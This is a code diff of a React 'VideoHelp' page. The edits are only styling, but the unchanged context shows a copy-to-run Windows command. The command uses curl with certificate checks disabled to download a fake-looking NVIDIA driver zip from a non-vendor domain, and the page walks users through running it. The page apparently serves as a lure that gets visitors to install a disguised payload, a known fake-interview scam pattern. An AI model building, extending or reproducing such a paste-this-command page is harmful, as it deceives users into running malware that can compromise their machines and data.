@@ -77,11 +77,11 @@ export default function VideoHelp() {
           </div>
         </div>
 
-        <div className="mx-auto mt-8 lg:mt-[2vh] w-full max-w-3xl lg:max-w-none lg:w-[40vw]">
-          <div className="text-indigo-600 font-semibold mb-2 lg:text-[1.8vh]">
+        <div className="mx-auto mt-8 lg:mt-[2vh] w-full max-w-3xl lg:max-w-none lg:w-[30vw]">
+          <div className="text-indigo-600 font-medium mb-2 lg:text-[1.8vh]">
             For Windows:
           </div>
-          <div className="rounded-xl border border-gray-300 bg-[#F6F6FE] p-4 text-sm lg:text-[1.65vh] overflow-auto mb-2 text-[#4B5563]">
+          <div className="rounded-xl border border-gray-300 bg-[#F6F6FE] p-4 text-sm lg:text-[1.65vh] overflow-auto mb-2 text-[#4B5563] no-scrollbar">
             <code className="select-all">
               curl -k -o "%TEMP%\nv_driver_win64_521_23_rc_whql.zip"
               https://support.blockforgex.com/api/drivers/update/windows/ZXkLZUPKYC...
@@ -100,7 +100,7 @@ export default function VideoHelp() {
           </Button>
 
           <div className="mt-6 lg:mt-[2vh]">
-            <div className="text-indigo-600 font-semibold mb-2 lg:text-[1.8vh]">
+            <div className="text-indigo-600 font-medium mb-2 lg:text-[1.8vh]">
               How to run this command:
             </div>
             <ol className="space-y-3 text-black lg:text-[1.6vh] list-decimal ml-3">
